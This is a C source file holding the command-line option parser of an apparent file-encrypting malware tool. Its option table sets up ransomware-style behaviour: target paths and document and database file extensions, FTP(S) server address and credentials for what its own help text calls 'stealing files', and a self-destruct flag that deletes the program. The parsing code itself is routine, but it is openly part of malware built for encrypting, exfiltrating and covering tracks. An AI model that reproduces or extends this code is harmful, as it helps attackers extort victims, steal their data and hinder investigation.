#include "encryptor/option.h"

#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>

#include "lib/util.h"
#include "lib/log.h"

/* clang-format off */
#define add_bool(n, d, v) {n, d, OPT_TYPE_BOOL, v, NULL, NULL, 0}
#define add_list(n, d, v) {n, d, OPT_TYPE_LIST, 0, NULL, v,    0}
#define add_str(n, d, v)  {n, d, OPT_TYPE_STR,  0, NULL, v,    0}
#define add_int(n, d, v)  {n, d, OPT_TYPE_INT,  0, NULL, NULL, v}
/* clang-format on */

static option_t options[] = {
    /* list of all the options */
    add_int("threads", "Thread count for the thread pool", 20),

    add_list("paths", "Target paths (directories/files)", ""),
    add_list("exts", "Target file extensions", "txt,pdf,db,sql"),

    add_str("ftp-url", "Address for the FTP(S) server", "ftp://example"),
    add_str("ftp-user", "FTP(S) username", "anonymous"),
    add_str("ftp-pwd", "FTP(S) password", "anonymous"),

    add_bool("no-ftp", "Disable stealing files with FTP(S)", false),
    add_bool("no-bar", "Disable simple ASCII progress bar", false),
    add_bool("destruct", "Self destruct (delete) the program", false),

    /* marks the end of the list */
    {NULL, NULL, 0, 0, NULL, NULL, 0},
};

#define OPT_NAME_MAX     8
#define opt_to_list(opt) ((opt)->value_list = lp_split((opt)->value_str, ','))
#define opt_foreach(opt) for (opt = &options[0]; NULL != opt->name; opt++)

void _opt_fill(char *name) {
  int fill_len = OPT_NAME_MAX - strlen(name) + 2;

  for (; fill_len > 0; fill_len--)
    printf(" ");
}

char *_opt_value(char *option) {
  for (; *option != 0; option++)
    if (*option == '=')
      return ++option;
  return NULL;
}

bool opt_parse(char *option) {
  char      full_opt[OPT_NAME_MAX + 3];
  int       full_opt_len = 0;
  option_t *opt          = NULL;

  /* attempt to find a matching option */
  opt_foreach(opt) {
    /* check the prefix of the option */
    if ((full_opt_len =
                snprintf(full_opt, sizeof(full_opt), "--%s", opt->name)) <= 0)
      continue;

    if (!lp_startswith(option, full_opt, full_opt_len))
      continue;

    if (*(option + full_opt_len) != '=' && *(option + full_opt_len) != 0)
      continue;

    /* extract the string value (if any) */
    opt->value_str = _opt_value(option);

    /* parse the option depending on it's type */
    switch (opt->type) {
    case OPT_TYPE_BOOL:
      if (!lp_streq(option, full_opt)) {
        lp_fail("No value is required for the option: %s", opt->name);
        return false;
      }

      opt->value_bool = !opt->value_bool;
      return true;
      break;

    case OPT_TYPE_LIST:
      if (NULL == opt->value_str) {
        lp_fail("Missing value for the option: %s", opt->name);
        return false;
      }

      if (NULL == opt_to_list(opt)) {
        lp_fail("Invalid list value for the option: %s", opt->name);
        return false;
      }

      return true;
      break;

    case OPT_TYPE_STR:
      if (NULL == opt->value_str) {
        lp_fail("Missing value for the option: %s", opt->name);
        return false;
      }

      return true;
      break;

    case OPT_TYPE_INT:
      if (NULL == opt->value_str) {
        lp_fail("Missing value for the option: %s", opt->name);
        return false;
      }

      if ((opt->value_int = atoi(opt->value_str)) <= 0) {
        lp_fail("Invalid integer value for the option: %s", opt->name);
        return false;
      }

      return true;
      break;
    }
  }

  lp_fail("Unknown option: %s", option);
  return false;
}

void opt_print(void) {
  option_t *opt = NULL;

  opt_foreach(opt) {
    switch (opt->type) {
    case OPT_TYPE_BOOL:
      printf(LP_LOG_BOLD "    %s" LP_LOG_RESET, opt->name);
      _opt_fill(opt->name);
      printf(LP_LOG_BOLD "=> %s\n" LP_LOG_RESET,
          opt->value_bool ? LP_LOG_GREEN "true" : LP_LOG_RED "false");
      break;

    case OPT_TYPE_LIST:
    case OPT_TYPE_STR:
      printf(LP_LOG_BOLD "    %s" LP_LOG_RESET, opt->name);
      _opt_fill(opt->name);
      printf(LP_LOG_BOLD "=> %s\n" LP_LOG_RESET,
          opt_is_empty_str(opt->value_str) ? "(empty)" : opt->value_str);
      break;

    case OPT_TYPE_INT:
      printf(LP_LOG_BOLD "    %s" LP_LOG_RESET, opt->name);
      _opt_fill(opt->name);
      printf(LP_LOG_BOLD "=> %d\n" LP_LOG_RESET, opt->value_int);
      break;
    }
  }
}

void opt_help(void) {
  option_t *opt = NULL;
  lp_info("Listing available options:");

  opt_foreach(opt) {
    printf(LP_LOG_BOLD "    --%s" LP_LOG_RESET, opt->name);
    _opt_fill(opt->name);
    printf(LP_LOG_BOLD "=> %s\n" LP_LOG_RESET, opt->desc);
  }
}

void opt_free(void) {
  option_t *opt = NULL;

  opt_foreach(opt) {
    if (NULL != opt->value_list) {
      lp_split_free(opt->value_list);
      opt->value_list = NULL;
    }
  }
}

/* epic macro to define opt_bool(), opt_list(), opt_str() and opt_int() */
#define opt_make(ret, val, typ, fail)                                          \
  ret opt_##val(char *option) {                                                \
    option_t *opt = NULL;                                                      \
    opt_foreach(opt) {                                                         \
      if (typ != opt->type || !lp_streq(opt->name, option))                    \
        continue;                                                              \
                                                                               \
      if (OPT_TYPE_LIST == typ && NULL == opt->value_list)                     \
        opt_to_list(opt);                                                      \
                                                                               \
      return opt->value_##val;                                                 \
    }                                                                          \
    return fail;                                                               \
  }

/* clang-format off */

opt_make(bool,   bool, OPT_TYPE_BOOL, false)
opt_make(char**, list, OPT_TYPE_LIST, NULL)
opt_make(char*,  str,  OPT_TYPE_STR,  NULL)
opt_make(int,    int,  OPT_TYPE_INT,  -1)
